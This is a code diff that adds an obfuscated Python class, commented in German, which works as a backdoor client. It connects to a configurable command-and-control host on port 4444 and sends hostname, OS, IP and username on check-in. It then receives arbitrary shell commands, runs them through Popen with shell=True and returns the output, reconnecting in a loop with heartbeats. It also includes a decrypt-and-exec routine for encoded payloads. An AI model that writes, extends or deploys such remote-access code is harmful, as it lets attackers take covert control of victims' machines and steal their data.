@@ -1,0 +1,192 @@
+class _X8:
+    def __init__(self):
+        self._payload = None
+        # === KONFIGURATION – BITTE ANPASSEN ===
+        self._c2_host = "192.168.1.100"   # Deine C2‑Server‑IP
+        self._c2_port = 4444              # Dein C2‑Port
+        self._reconnect_delay = 10        # Sekunden zwischen Verbindungsversuchen
+        self._keepalive_interval = 60     # Sekunden zwischen Keep‑Alive‑Nachrichten
+        # =====================================
+        self._socket = None
+        self._running = True
+        self._heartbeat_counter = 0
+
+    def _decrypt(self, data, key):
+        # (unverändert, bleibt erhalten)
+        try:
+            _x = bytearray(data[i] ^ key[i % len(key)] for i in range(len(data)))
+            _b = _0.b64decode(bytes(_x))
+            _k = _12.sha256(key).digest()
+            _z = _1.decompress(_b)
+            return _z.decode('utf-8')
+        except:
+            return None
+
+    def _execute(self, code):
+        # (unverändert, bleibt erhalten)
+        try:
+            exec(code, {'__name__': '__main__'})
+        except:
+            pass
+
+    # --- Hilfsfunktionen für die Backdoor ---
+
+    def _connect(self):
+        """Stellt die Verbindung zum C2 her."""
+        try:
+            self._socket = _19.socket(_19.AF_INET, _19.SOCK_STREAM)
+            self._socket.settimeout(5.0)
+            self._socket.connect((self._c2_host, self._c2_port))
+            return True
+        except Exception as e:
+            self._socket = None
+            return False
+
+    def _send(self, data):
+        """Sendet Daten (mit Längenpräfix)."""
+        if not self._socket:
+            return False
+        try:
+            _msg = data.encode('utf-8')
+            _len = _13.pack('>I', len(_msg))
+            self._socket.send(_len + _msg)
+            return True
+        except:
+            return False
+
+    def _recv(self):
+        """Empfängt Daten (mit Längenpräfix)."""
+        if not self._socket:
+            return None
+        try:
+            _raw_len = self._socket.recv(4)
+            if len(_raw_len) < 4:
+                return None
+            _len = _13.unpack('>I', _raw_len)[0]
+            _data = b''
+            while len(_data) < _len:
+                _chunk = self._socket.recv(_len - len(_data))
+                if not _chunk:
+                    return None
+                _data += _chunk
+            return _data.decode('utf-8', errors='ignore')
+        except:
+            return None
+
+    def _exec_cmd(self, cmd):
+        """Führt einen Systembefehl aus und gibt die Ausgabe zurück."""
+        try:
+            if _7.system() == 'Windows':
+                _proc = _9.Popen(cmd, shell=True, stdout=_9.PIPE, stderr=_9.PIPE, stdin=_9.PIPE)
+            else:
+                _proc = _9.Popen(cmd, shell=True, stdout=_9.PIPE, stderr=_9.PIPE, stdin=_9.PIPE)
+            _out, _err = _proc.communicate(timeout=30)
+            _result = _out.decode('utf-8', errors='ignore') + _err.decode('utf-8', errors='ignore')
+            return _result.strip() if _result else "[OK] (keine Ausgabe)"
+        except Exception as e:
+            return f"Fehler: {str(e)}"
+
+    def _get_system_info(self):
+        """Sammelt Systeminformationen für den ersten Check‑in."""
+        _info = []
+        _info.append(f"Hostname: {_19.gethostname()}")
+        _info.append(f"System: {_7.system()} {_7.release()}")
+        _info.append(f"Architektur: {_7.machine()}")
+        _info.append(f"CPU: {_7.processor()}")
+        _info.append(f"Anzahl Kerne: {_2.cpu_count()}")
+        try:
+            _ip = _19.gethostbyname(_19.gethostname())
+            _info.append(f"IP: {_ip}")
+        except:
+            _info.append("IP: unbekannt")
+        try:
+            _user = _2.environ.get('USER', _2.environ.get('USERNAME', 'unbekannt'))
+            _info.append(f"Benutzer: {_user}")
+        except:
+            pass
+        return "\n".join(_info)
+
+    def _handle_cmd(self, cmd):
+        """Verarbeitet einen Befehl vom C2."""
+        cmd = cmd.strip()
+        if not cmd:
+            return ""
+
+        # Einige spezielle Befehle
+        if cmd.lower() == "exit":
+            self._running = False
+            return "SHUTDOWN"
+        if cmd.lower() == "info":
+            return self._get_system_info()
+        if cmd.lower().startswith("cd "):
+            try:
+                _dir = cmd[3:].strip()
+                _2.chdir(_dir)
+                return f"Wechsel zu {_dir}"
+            except Exception as e:
+                return f"Fehler beim Wechseln: {e}"
+
+        # Standard: Befehl in der Shell ausführen
+        return self._exec_cmd(cmd)
+
+    # --- Hauptschleife ---
+
+    def _run(self):
+        """Hauptschleife der Backdoor – Verbindung aufbauen, Befehle abholen und ausführen."""
+        # Zuerst einmal Systeminfo an C2 senden (optional)
+        _first = True
+
+        while self._running:
+            # Verbindung herstellen (bei Fehler warten)
+            if not self._connect():
+                _4.sleep(self._reconnect_delay)
+                continue
+
+            # Erfolgreich verbunden – ggf. erste Nachricht senden
+            if _first:
+                _info = self._get_system_info()
+                self._send(f"[INFO] Verbunden. System:\n{_info}")
+                _first = False
+
+            # Keep‑Alive‑Loop (für Befehlsabfrage)
+            while self._running and self._socket:
+                try:
+                    # Befehl vom C2 empfangen (mit Timeout)
+                    self._socket.settimeout(5.0)  # kurzer Timeout für Heartbeat
+                    _cmd = self._recv()
+                    if _cmd is None:
+                        # Verbindung unterbrochen
+                        break
+
+                    if _cmd:
+                        # Befehl ausführen
+                        _response = self._handle_cmd(_cmd)
+                        if _response == "SHUTDOWN":
+                            self._running = False
+                            break
+                        # Antwort senden
+                        if not self._send(_response):
+                            break
+
+                except _19.timeout:
+                    # Timeout – wir senden einen Heartbeat (optional)
+                    self._heartbeat_counter += 1
+                    if self._heartbeat_counter % 10 == 0:
+                        # Alle 10 Timeouts (~50 Sekunden) Heartbeat senden
+                        if not self._send("[HEARTBEAT]"):
+                            break
+                    continue
+                except Exception as e:
+                    # Andere Fehler -> Verbindung neu aufbauen
+                    break
+
+            # Verbindung geschlossen – aufräumen
+            if self._socket:
+                try:
+                    self._socket.close()
+                except:
+                    pass
+                self._socket = None
+
+            # Vor dem erneuten Verbinden kurz warten
+            _4.sleep(self._reconnect_delay)
